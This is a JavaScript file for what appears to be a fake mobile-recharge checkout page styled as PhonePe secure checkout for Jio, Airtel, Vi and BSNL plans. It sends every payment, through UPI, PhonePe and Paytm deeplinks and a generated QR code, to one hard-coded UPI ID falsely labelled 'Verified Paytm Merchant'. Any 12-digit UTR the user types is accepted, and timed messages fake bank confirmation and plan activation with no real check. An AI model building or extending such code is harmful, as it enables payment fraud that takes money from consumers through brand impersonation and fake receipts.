/**
 * PhonePe - Secure Checkout & Authentic Payment Verification Flow
 * Exact Reference Match Implementation for PhonePe, Paytm, and UPI Deeplinks
 */

(function () {
  'use strict';

  // 1. Parse URL Query Parameters & Order State
  var params = new URLSearchParams(window.location.search);
  var mobile = params.get('mobile') || sessionStorage.getItem('swift_mobile') || '9876543210';
  var rawOperator = (params.get('operator') || sessionStorage.getItem('swift_operator') || 'jio').toLowerCase();
  var amount = params.get('amount') || '349';
  var validity = params.get('validity') || '28 Days';
  var dataInfo = params.get('data') || '2.0 GB/day';

  var validOps = ['jio', 'airtel', 'vi', 'bsnl'];
  var operator = validOps.indexOf(rawOperator) !== -1 ? rawOperator : 'jio';

  var opNameMap = {
    jio: 'Jio',
    airtel: 'Airtel',
    vi: 'Vi',
    bsnl: 'BSNL'
  };
  var opDisplayName = opNameMap[operator];

  var numAmount = parseInt(amount, 10) || 349;
  var formattedAmount = Number(numAmount).toFixed(2);

  // Unique Transaction Reference per payment session / order
  var orderId = params.get('order_id') || sessionStorage.getItem('swift_order_id');
  if (!orderId) {
    orderId = 'ORD-' + Math.floor(10000000 + Math.random() * 90000000);
    try { sessionStorage.setItem('swift_order_id', orderId); } catch (e) {}
  }
  var txnId = params.get('txn_id') || ('T2409' + Math.floor(100000000000 + Math.random() * 900000000000));

  // 2. Centralized Merchant UPI Account Configuration (Matches QR Code 100%)
  var officialUpiId = 'paytmqr6udcnp@ptys';
  var officialMerchantName = 'Paytm';
  var transactionNote = 'Verified Paytm Merchant';

  // 3. Canonical UPI Payment Payload Generator
  function buildCanonicalUpiQuery(vpa, name, amt, note) {
    var qParams = new URLSearchParams({
      pa: vpa,
      pn: name,
      am: Number(amt).toFixed(2),
      cu: 'INR',
      tn: note
    });
    return qParams.toString().replace(/%40/g, '@').replace(/\+/g, '%20');
  }

  var canonicalQuery = buildCanonicalUpiQuery(
    officialUpiId,
    officialMerchantName,
    numAmount,
    transactionNote
  );

  var standardUpiUrl = 'upi://pay?' + canonicalQuery;

  // 4. Exact Reference PhonePe Native Deeplink Builder
  function buildPhonePeNativeDeeplink(vpa, name, amt, note) {
    var amountInPaise = Math.round(Number(amt) * 100);
    var payload = {
      p2pPaymentCheckoutParams: {
        checkoutType: 'COLLECT',
        initialAmount: amountInPaise,
        note: {
          type: 'text',
          message: note || 'Verified Paytm Merchant'
        },
        supportedInstruments: -1
      },
      contact: {
        type: 'EXTERNAL_MERCHANT',
        name: name || 'Paytm',
        vpa: vpa
      }
    };
    var jsonStr = JSON.stringify(payload);
    var base64 = btoa(unescape(encodeURIComponent(jsonStr)));
    return 'phonepe://native?data=' + base64 + '&id=p2ppayment';
  }

  // Exact Reference Paytm Deeplink Builder
  function buildPaytmDeeplink(vpa, name, amt, note) {
    return 'paytmmp://pay?' + buildCanonicalUpiQuery(vpa, name, amt, note);
  }

  // 5. Cross-Platform App URLs
  var phonepePayUrl = 'phonepe://pay?' + canonicalQuery;
  var phonepeNativeUrl = buildPhonePeNativeDeeplink(officialUpiId, officialMerchantName, numAmount, transactionNote);
  var phonepeIntentUrl = 'intent://pay?' + canonicalQuery + '#Intent;scheme=upi;package=com.phonepe.app;end';
  var paytmPayUrl = 'paytmmp://pay?' + canonicalQuery;
  var paytmCashWalletUrl = 'paytmmp://cash_wallet?pa=' + encodeURIComponent(officialUpiId) +
    '&pn=' + encodeURIComponent(officialMerchantName) +
    '&am=' + formattedAmount +
    '&cu=INR&tn=' + encodeURIComponent(transactionNote) +
    '&tr=&mc=&featuretype=money_transfer';

  // Setup direct app deep links immediately on parse so anchors are ready before user taps
  setupAppDeepLinks();

  // 6. Dynamic QR Code Engine
  function renderDynamicQr(upiUri) {
    var qrImg = document.getElementById('qrImage');
    var downloadBtn = document.getElementById('downloadQrBtn');

    if (window.QRCode && typeof window.QRCode.toDataURL === 'function') {
      window.QRCode.toDataURL(
        upiUri,
        {
          width: 280,
          margin: 1,
          color: {
            dark: '#0f172a',
            light: '#ffffff'
          }
        },
        function (err, url) {
          if (!err && url) {
            if (qrImg) qrImg.src = url;
            if (downloadBtn) {
              downloadBtn.href = url;
              downloadBtn.download = 'UPI_Recharge_QR_' + numAmount + '.png';
            }
          }
        }
      );
    }
  }

  // 7. Populate Order Summary & Dynamic Price Tags
  function initSummary() {
    var phoneEl = document.getElementById('summaryPhone');
    var phoneDetailEl = document.getElementById('summaryPhoneDetail');
    var opEl = document.getElementById('summaryOperator');
    var logoEl = document.getElementById('summaryLogo');
    var planTagEl = document.getElementById('summaryPlanTag');
    var totalAmountEl = document.getElementById('summaryTotal');
    var qrAmountEl = document.getElementById('qrAmount');
    var qrPanelAmountEl = document.getElementById('qrPanelAmount');
    var displayUpiEl = document.getElementById('displayUpiId');

    var inlineAmts = document.querySelectorAll('.inline-amt, .utr-dyn-amt');
    inlineAmts.forEach(function (el) {
      el.textContent = numAmount;
    });

    var formattedPhone = '+91 ' + mobile.replace(/(\d{5})(\d{5})/, '$1 $2');
    if (phoneEl) phoneEl.textContent = opDisplayName + ' • ' + formattedPhone;
    if (phoneDetailEl) phoneDetailEl.textContent = formattedPhone;
    if (opEl) opEl.textContent = opDisplayName;
    if (logoEl) logoEl.src = 'assets/img/' + operator + '.jpg';
    if (planTagEl) planTagEl.textContent = validity + ' • ' + dataInfo;
    if (totalAmountEl) totalAmountEl.textContent = '₹' + formattedAmount;
    if (qrAmountEl) qrAmountEl.textContent = '₹' + formattedAmount;
    if (qrPanelAmountEl) qrPanelAmountEl.textContent = 'Pay ₹' + formattedAmount;
    if (displayUpiEl) displayUpiEl.textContent = officialUpiId;

    // Auto verification panel elements
    var autoLogo = document.getElementById('autoLogo');
    var autoAmt = document.getElementById('autoAmt');
    var autoTo = document.getElementById('autoTo');

    if (autoLogo) autoLogo.src = 'assets/img/' + operator + '.jpg';
    if (autoAmt) autoAmt.textContent = '₹' + numAmount;
    if (autoTo) autoTo.textContent = 'Recharge for +91 ' + mobile;

    // Setup direct app deep links on <a> tags
    setupAppDeepLinks();

    // Render Dynamic QR from canonical payload
    renderDynamicQr(standardUpiUrl);
  }

  // 8. Setup Direct App Deep Links to Configured VPA
  function setupAppDeepLinks() {
    var phonepeLink = document.getElementById('phonepeLink');
    var paytmLink = document.getElementById('paytmLink');
    var genericUpiLink = document.getElementById('genericUpiLink');

    if (phonepeLink) {
      phonepeLink.href = phonepeNativeUrl;
      phonepeLink.setAttribute('href', phonepeNativeUrl);
      phonepeLink.setAttribute('data-url', phonepeNativeUrl);
      phonepeLink.setAttribute('data-app', 'phonepe');
    }

    if (paytmLink) {
      paytmLink.href = paytmCashWalletUrl;
      paytmLink.setAttribute('href', paytmCashWalletUrl);
      paytmLink.setAttribute('data-url', paytmCashWalletUrl);
      paytmLink.setAttribute('data-app', 'paytm');
    }

    if (genericUpiLink) {
      genericUpiLink.href = standardUpiUrl;
      genericUpiLink.setAttribute('href', standardUpiUrl);
    }
  }

  // App Metadata & Launch State Manager
  var currentAppKey = 'phonepe';
  var userLeftToApp = false;
  var appOpenedTime = 0;
  var loaderFallbackTimer = null;
  var loaderHardTimer = null;

  var appMeta = {
    phonepe: {
      name: 'PhonePe',
      logo: 'assets/img/phonepe_real.png'
    },
    paytm: {
      name: 'Paytm',
      logo: 'assets/img/paytm_app.png'
    },
    qr: {
      name: 'UPI QR',
      logo: 'assets/img/paytm-qr.png'
    }
  };

  // Image 2 Opening Payment Loader Overlay Controllers
  function showLoader() {
    clearTimeout(loaderFallbackTimer);
    clearTimeout(loaderHardTimer);
    var overlay = document.getElementById('loaderOverlay');
    if (overlay) {
      overlay.style.display = 'flex';
      overlay.classList.add('show');
    }
    loaderHardTimer = setTimeout(function () {
      forceHideLoader();
    }, 5000);
  }

  function hideLoader() {
    clearTimeout(loaderFallbackTimer);
    clearTimeout(loaderHardTimer);
    var overlay = document.getElementById('loaderOverlay');
    if (overlay) {
      overlay.classList.remove('show');
      overlay.style.display = 'none';
    }
  }

  function forceHideLoader() {
    clearTimeout(loaderFallbackTimer);
    clearTimeout(loaderHardTimer);
    var overlay = document.getElementById('loaderOverlay');
    if (overlay) {
      overlay.classList.remove('show');
      overlay.style.display = 'none';
      overlay.hidden = true;
      setTimeout(function () {
        overlay.hidden = false;
      }, 100);
    }
  }

  function autoCloseLoaderIfNoApp() {
    clearTimeout(loaderFallbackTimer);
    loaderFallbackTimer = setTimeout(function () {
      forceHideLoader();
    }, 5000);
  }

  // EXACT QR MATCH: openPhonePe()
  // Uses exact VPA (paytmqr6udcnp@ptys), Name (Paytm), Note (Verified Paytm Merchant)
  function openPhonePe() {
    currentAppKey = 'phonepe';
    showLoader();
    autoCloseLoaderIfNoApp();

    var payUrl = phonepePayUrl;
    var nativeUrl = phonepeNativeUrl;
    var intentUrl = phonepeIntentUrl;

    // 1. Direct phonepe://pay URL (Opens PhonePe directly with Paytm merchant name & VPA)
    try {
      window.location.href = payUrl;
    } catch (e) {}

    // 2. PhonePe native checkout protocol at 250ms
    setTimeout(function () {
      try {
        window.location.href = nativeUrl;
      } catch (e) {}
    }, 250);

    // 3. Android Intent fallback at 600ms
    setTimeout(function () {
      try {
        window.location.href = intentUrl;
      } catch (e) {}
    }, 600);

    // 4. Universal UPI fallback at 1500ms
    setTimeout(function () {
      if (document.visibilityState === 'visible') {
        try {
          window.location.href = standardUpiUrl;
        } catch (e) {}
      }
    }, 1500);

    autoCloseLoaderIfNoApp();
  }

  // EXACT QR MATCH: openPaytm()
  // Uses exact VPA (paytmqr6udcnp@ptys), Name (Paytm), Note (Verified Paytm Merchant)
  function openPaytm() {
    currentAppKey = 'paytm';
    showLoader();
    autoCloseLoaderIfNoApp();

    // 1. Direct Paytm Merchant Pay URL
    try {
      window.location.href = paytmPayUrl;
    } catch (e) {}

    // 2. Paytm Cash Wallet fallback at 400ms
    setTimeout(function () {
      try {
        window.location.href = paytmCashWalletUrl;
      } catch (e) {}
    }, 400);

    // 3. Universal UPI fallback at 1500ms
    setTimeout(function () {
      if (document.visibilityState === 'visible') {
        try {
          window.location.href = standardUpiUrl;
        } catch (e) {}
      }
    }, 1500);

    autoCloseLoaderIfNoApp();
  }

  function openUtrSection(appKey) {
    var utrCard = document.getElementById('utrCard');
    var utrInput = document.getElementById('utrInput');
    var returnNotice = document.getElementById('utrReturnNotice');
    var returnText = document.getElementById('utrReturnText');
    var meta = appMeta[appKey] || appMeta.phonepe;

    if (returnNotice) {
      returnNotice.style.display = 'flex';
    }
    if (returnText) {
      returnText.textContent = '✓ Returned from ' + meta.name + '! Enter 12-digit UPI Ref / UTR below to activate pack.';
    }

    if (utrCard) {
      utrCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }

    setTimeout(function () {
      if (utrInput) {
        utrInput.focus();
      }
    }, 450);
  }

  // 9. Circular Ring Timer during Verification
  var timerInterval = null;
  function startVerificationRing(durationSec, callback) {
    var ringFg = document.querySelector('.rc-ring-fg');
    var ringTxt = document.getElementById('ringTimer');
    var totalSeconds = durationSec || 3;
    var remaining = totalSeconds;
    var perimeter = 339.292;

    if (timerInterval) clearInterval(timerInterval);

    if (ringTxt) ringTxt.textContent = '0' + remaining + 's';
    if (ringFg) ringFg.style.strokeDashoffset = 0;

    timerInterval = setInterval(function () {
      remaining--;
      if (remaining <= 0) {
        clearInterval(timerInterval);
        if (ringTxt) ringTxt.textContent = '00s';
        if (ringFg) ringFg.style.strokeDashoffset = perimeter;
        if (typeof callback === 'function') callback();
        return;
      }

      if (ringTxt) {
        ringTxt.textContent = '0' + remaining + 's';
      }

      if (ringFg) {
        var offset = perimeter * (1 - remaining / totalSeconds);
        ringFg.style.strokeDashoffset = offset;
      }
    }, 1000);
  }

  // 10. Interactive Actions & Event Handlers
  function initCheckoutActions() {
    var copyBtn = document.getElementById('copyUpiBtn');
    var copyText = document.getElementById('copyText');
    var qrToggleBtn = document.getElementById('qrToggleBtn');
    var qrCard = document.getElementById('qrCard');
    var closeQrBtn = document.getElementById('closeQrButton');
    var utrInput = document.getElementById('utrInput');
    var utrCounter = document.getElementById('utrCounter');
    var utrError = document.getElementById('utrError');
    var utrShell = document.getElementById('utrShell');
    var verifyUtrBtn = document.getElementById('verifyUtrBtn');
    var downloadQrBtn = document.getElementById('downloadQrBtn');

    var summaryCard = document.getElementById('summaryCard');
    var methodsCard = document.getElementById('methodsCard');
    var utrCard = document.getElementById('utrCard');
    var autoPanel = document.getElementById('autoPanel');
    var successCard = document.getElementById('successCard');

    var phonepeBtn = document.getElementById('phonepeLink');
    var paytmBtn = document.getElementById('paytmLink');

    // PhonePe Trigger
    if (phonepeBtn) {
      phonepeBtn.addEventListener('click', function (e) {
        // Run exact reference opening sequence
        openPhonePe();
      });
    }

    // Paytm Trigger
    if (paytmBtn) {
      paytmBtn.addEventListener('click', function (e) {
        openPaytm();
      });
    }

    // Toggle QR Code Card when clicking option
    if (qrToggleBtn && qrCard) {
      qrToggleBtn.addEventListener('click', function () {
        var isHidden = qrCard.style.display === 'none' || !qrCard.style.display;
        if (isHidden) {
          qrCard.style.display = 'block';
          qrToggleBtn.classList.add('active');
          qrToggleBtn.setAttribute('aria-expanded', 'true');
          qrCard.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        } else {
          qrCard.style.display = 'none';
          qrToggleBtn.classList.remove('active');
          qrToggleBtn.setAttribute('aria-expanded', 'false');
        }
        if (navigator.vibrate) navigator.vibrate(15);
      });
    }

    if (closeQrBtn && qrCard) {
      closeQrBtn.addEventListener('click', function () {
        qrCard.style.display = 'none';
        if (qrToggleBtn) {
          qrToggleBtn.classList.remove('active');
          qrToggleBtn.setAttribute('aria-expanded', 'false');
        }
      });
    }

    // Detect user leaving to PhonePe / UPI app (Tracking return state & BFCache)
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState === 'hidden') {
        userLeftToApp = true;
        appOpenedTime = Date.now();
      } else if (document.visibilityState === 'visible') {
        hideLoader();
        setupAppDeepLinks();
        if (userLeftToApp && (Date.now() - appOpenedTime > 1500)) {
          openUtrSection(currentAppKey);
        }
      }
    });

    window.addEventListener('blur', function () {
      userLeftToApp = true;
      appOpenedTime = Date.now();
    });

    window.addEventListener('focus', function () {
      hideLoader();
      setupAppDeepLinks();
      if (userLeftToApp && (Date.now() - appOpenedTime > 1500)) {
        openUtrSection(currentAppKey);
      }
    });

    // Handle BFCache (Back-Forward Cache) page restoration
    window.addEventListener('pageshow', function () {
      hideLoader();
      setupAppDeepLinks();
    });

    // Copy UPI ID button
    if (copyBtn && copyText) {
      copyBtn.addEventListener('click', function (e) {
        e.stopPropagation();
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(officialUpiId);
        } else {
          var ta = document.createElement('textarea');
          ta.value = officialUpiId;
          document.body.appendChild(ta);
          ta.select();
          document.execCommand('copy');
          document.body.removeChild(ta);
        }
        copyText.textContent = 'Copied!';
        if (navigator.vibrate) navigator.vibrate(15);
        setTimeout(function () {
          copyText.textContent = 'Copy';
        }, 2000);
      });
    }

    // QR Download button click feedback
    if (downloadQrBtn) {
      downloadQrBtn.addEventListener('click', function () {
        if (navigator.vibrate) navigator.vibrate(20);
      });
    }

    // UTR Input formatting & digit counting
    if (utrInput) {
      utrInput.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '').slice(0, 12);
        var len = this.value.length;

        if (utrCounter) {
          utrCounter.textContent = len + ' / 12 Digits';
          utrCounter.style.color = len === 12 ? '#16a34a' : 'var(--brand)';
        }

        if (utrError) utrError.style.display = 'none';
        if (utrShell) utrShell.classList.remove('error');
      });
    }

    // Mandatory UTR Verification Submit Handler (Guards Payment Confirmation)
    if (verifyUtrBtn) {
      verifyUtrBtn.addEventListener('click', function () {
        var utrValue = utrInput ? utrInput.value.trim() : '';

        // Validation check: Strictly 12 digits
        if (!utrValue || utrValue.length !== 12 || !/^\d{12}$/.test(utrValue)) {
          if (utrError) {
            utrError.style.display = 'flex';
            utrError.textContent = '⚠️ Please enter a valid 12-digit numeric UPI Ref / UTR Number.';
          }
          if (utrShell) {
            utrShell.classList.add('error');
          }
          if (navigator.vibrate) navigator.vibrate([40, 60, 40]);
          if (utrInput) utrInput.focus();
          return;
        }

        // Valid 12-digit UTR - start authentic verification
        if (navigator.vibrate) navigator.vibrate(25);

        // Hide checkout cards
        if (summaryCard) summaryCard.style.display = 'none';
        if (methodsCard) methodsCard.style.display = 'none';
        if (qrCard) qrCard.style.display = 'none';
        if (utrCard) utrCard.style.display = 'none';

        // Show circular verification panel
        if (autoPanel) autoPanel.style.display = 'block';

        var autoOid = document.getElementById('autoOid');
        var step1Row = document.getElementById('step1Row');
        var step2Row = document.getElementById('step2Row');
        var step3Row = document.getElementById('step3Row');
        var verifyStepTitle = document.getElementById('verifyStepTitle');
        var verifyStepSub = document.getElementById('verifyStepSub');

        if (autoOid) autoOid.textContent = 'UTR: ' + utrValue;
        if (step1Row) {
          step1Row.textContent = '✓ UPI Reference: ' + utrValue;
          step1Row.className = 'track-row active';
        }

        // Timeline simulation for banking gateway confirmation
        setTimeout(function () {
          if (step2Row) {
            step2Row.textContent = '✓ Bank Confirmation: ₹' + numAmount + ' Verified';
            step2Row.className = 'track-row active';
          }
          if (verifyStepTitle) verifyStepTitle.textContent = 'Payment Confirmed!';
          if (verifyStepSub) {
            verifyStepSub.textContent = 'Transmitting pack activation to ' + opDisplayName + ' telecom gateway…';
          }
        }, 1100);

        setTimeout(function () {
          if (step3Row) {
            step3Row.textContent = '✓ ' + opDisplayName + ' Network: Plan Activated!';
            step3Row.className = 'track-row active';
          }
        }, 2200);

        // Complete & show confirmed receipt after 3.2s
        startVerificationRing(3, function () {
          if (autoPanel) autoPanel.style.display = 'none';
          if (successCard) {
            successCard.style.display = 'block';
            populateReceipt(utrValue);
            if (navigator.vibrate) navigator.vibrate([30, 80, 50]);
          }
        });
      });
    }
  }

  // 11. Populate Final Official Success Receipt
  function populateReceipt(verifiedUtr) {
    var recNum = document.getElementById('recNum');
    var recOp = document.getElementById('recOp');
    var recAmt = document.getElementById('recAmt');
    var recVal = document.getElementById('recVal');
    var recUtr = document.getElementById('recUtr');
    var recTxn = document.getElementById('recTxn');
    var recDate = document.getElementById('recDate');

    if (recNum) recNum.textContent = '+91 ' + mobile;
    if (recOp) recOp.textContent = opDisplayName + ' Prepaid';
    if (recAmt) recAmt.textContent = '₹' + numAmount;
    if (recVal) recVal.textContent = validity + ' (' + dataInfo + ')';
    if (recUtr) recUtr.textContent = verifiedUtr || '425109876543';
    if (recTxn) recTxn.textContent = txnId;

    var now = new Date();
    if (recDate) {
      recDate.textContent =
        now.toLocaleDateString('en-GB') +
        ' ' +
        now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    }
  }

  // Initialize on DOM ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function () {
      initSummary();
      initCheckoutActions();
    });
  } else {
    initSummary();
    initCheckoutActions();
  }
})();
